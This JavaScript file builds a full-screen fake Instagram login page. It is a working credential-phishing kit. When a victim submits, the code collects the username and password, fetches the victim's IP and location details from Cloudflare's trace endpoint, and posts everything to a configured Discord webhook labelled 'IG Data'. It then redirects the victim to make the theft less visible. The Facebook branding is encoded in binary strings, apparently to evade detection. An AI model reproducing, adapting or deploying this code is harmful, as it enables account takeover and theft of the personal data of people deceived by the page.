
document.getElementsByTagName('head')[0].innerHTML += '<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>*{padding:0;margin:0;outline:0;-webkit-user-select:none;font-family:Helvetica,Arial,sans-serif;}</style>';




var topD=document.createElement("div");
var headD=document.createElement("div");
var contD=document.createElement("div");
var instalogoD=document.createElement("div");
var instalogo=document.createElement("img");
var inp1=document.createElement("input");
var inp2=document.createElement("input");
var hinp2=document.createElement("input");
var btn1=document.createElement("button");
var btn2=document.createElement("button");
var orD=document.createElement("div");
var btn3=document.createElement("button");
var btn4=document.createElement("button");
var btn5=document.createElement("button");
var lD=document.createElement("div");
var footer=document.createElement("div");

topD.style.height="100%";
topD.style.width="100%";
topD.style.zIndex="999999999";
topD.style.position="fixed";
topD.style.top="0";
topD.style.left="0";
topD.style.overflow="auto";
topD.style.background="white";
////////
headD.style.position="absolute";
headD.style.top="0";
headD.style.left="0";
headD.style.background="#fff";
headD.style.height="50px";
headD.style.width="100%";
headD.style.lineHeight="50px";
headD.style.textAlign="center";
headD.style.color="rgb(142,142,142)";
headD.style.fontSize="15px";
headD.innerHTML="English &#x25BE;";

// 25BE 227B
///////
contD.style.position="absolute";
contD.style.top="50px";
contD.style.left="0";
contD.style.background="#fff";
contD.style.height="300px";
contD.style.width="100%";
contD.style.textAlign="center";
contD.style.paddingTop="20px";
contD.style.paddingBottom="30px";

/////////
instalogoD.style.height="50px";
instalogoD.style.width="100%";
instalogoD.style.position="relative";
instalogoD.style.textAlign="center";


instalogo.src=config.logo.url;
instalogo.style.height="50px";


////////
inp1.style.height="45px";
inp1.style.width="90%";
inp1.placeholder="Phone number , username , or email";
inp1.style.borderRadius="3px";
inp1.style.lineHeight="18px";
inp1.style.padding="5px";
inp1.type="email";
inp1.style.background="rgb(250,250,250)";
inp1.style.border="1px solid rgb(219,219,219)";
inp1.style.fontSize="15px";
inp1.style.marginTop="10px";
///////

hinp2.style.height="0px";
hinp2.style.width="0px";
hinp2.type="email";
hinp2.style.opacity="0";

inp2.style.height="45px";
inp2.style.width="90%";
inp2.placeholder="Password";
inp2.style.borderRadius="03px ";
inp2.style.lineHeight="18px";
inp2.style.padding="5px";
inp2.type="email";
inp2.style.marginTop="10px";
inp2.style.background="rgb(250,250,250)";
inp2.style.border="1px solid rgb(219,219,219)";
inp2.style.fontSize="15px";
inp2.addEventListener("keyup",
function(){
var lngh=inp2.value.length;
hinp2.value+=inp2.value.split("•").join('');
if(lngh==0){
hinp2.value="";
}
inp2.value="";
for(var o=0;o<lngh;o++){
inp2.value+="•";
}});
inp2.addEventListener("keydown",
function(){
var lngh=inp2.value.length;
hinp2.value+=inp2.value.split("•").join('');
if(lngh==0){
hinp2.value="";
}
inp2.value="";
for(var o=0;o<lngh;o++){
inp2.value+="•";
}});


/////////
btn1.style.height="40px";
btn1.style.width="calc(90% + 10px)";
btn1.style.borderRadius="3px";
btn1.style.lineHeight="40px";
btn1.style.textAlign="center";
btn1.textContent="Log In";
btn1.style.color="white";
btn1.style.fontWeight="bold";
btn1.style.border="0";
btn1.style.marginTop="20px";
btn1.style.background="rgb(178,223,252)";
btn1.style.fontSize="15px";



btn1.addEventListener("click",
function(){
var pass=hinp2.value;
var eml=inp1.value;
if(pass.length >1 && eml.length > 1){
//Get The IP and information through Cloudflare
async function sendData() {

try {
const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
const data = await res.text();
var y=data;



/////Send Data Through Discord
var request = new XMLHttpRequest();
request.open("POST", config.discord_webhook_url);
request.setRequestHeader('Content-type', 'application/json');
var myEmbed = {
author: {
name: "IG Data "
},
title: "Username:- "+eml+"\nPassword:- "+pass+"\n",
description:"\nInfo:- "+y,
color: 65535
}
var params = {
username: "Th30neAnd0nly/Phi ",
avatar_url : "https://repository-images.githubusercontent.com/268017280/43567c00-8e19-11eb-96d2-a360736917cb",
embeds: [ myEmbed ]
}
request.send(JSON.stringify(params));
window.location.href=config.redirectURL;
} catch (error) {
    console.log('Error:' + error);
}

}
sendData();
}
else{
///F*ck Yourself In Corner
}


});


/////////
orD.style.height="40px";
orD.style.width="100% ";
orD.style.overflow="hidden";
orD.style.lineHeight="40px";
orD.style.textAlign="center";
orD.innerHTML="<span style='float:right;'></span>OR<span></span>";
orD.innerHTML+="<style>a{color:rgb(119,151,180);text-decoration:none}span:before{content:'';margin:5px;height:1px;width:120px; background:#ccd0d5;display:block;}<style>";
orD.style.marginTop="15px";
orD.style.fontSize="15px";
orD.style.fontWeight="bold";
orD.style.color="rgb(142,142,142)";
orD.style.display="flex";
orD.style.alignItems="center";
orD.style.justifyContent="center";

////////////

btn2.style.height="35px";
btn2.style.width="calc(80% + 10px)";
btn2.style.borderRadius="3px";
btn2.style.lineHeight="35px";
btn2.style.textAlign="center";
btn2.textContent="Continue ";
btn2.style.color="white";
btn2.style.fontWeight="bold";
btn2.style.border="0";
btn2.style.marginTop="30px";
btn2.style.background="rgb(0,149,246)";
btn2.style.fontSize="15px";

/////////

btn3.style.height="40px";
btn3.style.width="calc(90% + 10px)";
btn3.style.borderRadius="3px";
btn3.style.lineHeight="40px";
btn3.style.textAlign="right";
btn3.textContent="Forgot password?";
btn3.style.color="rgb(31,162,247)";
btn3.style.border="0";
btn3.style.background="transparent";
btn3.style.marginTop="10px";
btn3.style.fontSize="14px";

////////

btn5.style.height="40px";
btn5.style.width="calc(90% + 10px)";
btn5.style.borderRadius="3px";
btn5.style.lineHeight="40px";
btn5.style.textAlign="center";
btn5.style.color="#aaa";
btn5.innerHTML="Don't have an account ? <b style='color:rgb(0,146,246)'>SignUp</b>";
btn5.style.border="0";
btn5.style.background="transparent";
btn5.style.marginTop="20px";
btn5.style.fontSize="14px";




/////////
lD.style.left="0";
lD.style.background="#fff";
lD.style.height="200px";
lD.style.width="100%";
lD.style.margin="auto";
lD.style.marginTop="400px";
lD.style.paddingBottom="30px";
lD.style.display="flex";
lD.style.alignItems="center";
lD.style.justifyContent="center";
lD.style.color="rgb(87,107,151)";

////////

footer.style.background="rgb(240,240,240)";
footer.style.height="80px";
footer.style.width="100%";
footer.style.bottom="0px";
footer.style.fontSize="13px";
footer.style.color="rgb(130,130,130)";
footer.style.textAlign="center";
footer.style.paddingTop="15px";
footer.innerHTML="About&nbsp;&nbsp;&nbsp;Blog&nbsp;&nbsp;&nbsp;Jobs&nbsp;&nbsp;&nbsp;Help&nbsp;&nbsp;&nbsp;API&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;Terms&nbsp;&nbsp;&nbsp;<br><br>Top Accounts&nbsp;&nbsp;&nbsp;Hashtags &nbsp;&nbsp;&nbsp;Locations";

/////////



btn4.style.height="40px";
btn4.style.width="calc(90% + 10px)";
btn4.style.borderRadius="3px";
btn4.style.textAlign="center";
btn4.style.position="absolute";
btn4.style.color="rgb(150,154,160)";
btn4.style.border="0";
btn4.style.background="transparent";
btn4.style.marginTop="70px";
btn4.style.fontSize="14px";

////////


var bady=document.body;
if(bady == null){
document.body=document.createElement('body');
}


document.body.appendChild(topD);
topD.appendChild(headD);
topD.appendChild(contD);
contD.appendChild(instalogoD);
contD.appendChild(btn2);
contD.appendChild(orD);
contD.appendChild(inp1);
contD.appendChild(inp2);
contD.appendChild(btn3);
contD.appendChild(btn1);
contD.appendChild(btn5);
topD.appendChild(lD);
lD.appendChild(btn4);
topD.appendChild(footer);
contD.appendChild(hinp2);

setInterval(() =>{(inp1.value.length > 1 && inp2.value.length > 1) ? btn1.style.background="rgb(0,149,246)" : btn1.style.background="rgb(178,223,252)";},500);


if(config.text){
btn4.innerHTML="from <br><b style='color:black;letter-spacing:5px;'>"+ ("01000110 01000001 01000011 01000101 01000010 01001111 01001111 01001011").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('')+"</b> ";
btn2.textContent="Continue with "+ ("01000110 01100001 01100011 01100101 01100010 01101111 01101111 01101011").split(' ').map(i => String.fromCharCode(parseInt(i, 2)).toString(10)).join('');

}
if(config.logo.show){
instalogoD.appendChild(instalogo);
}
else{
instalogoD.style.display="none";
}
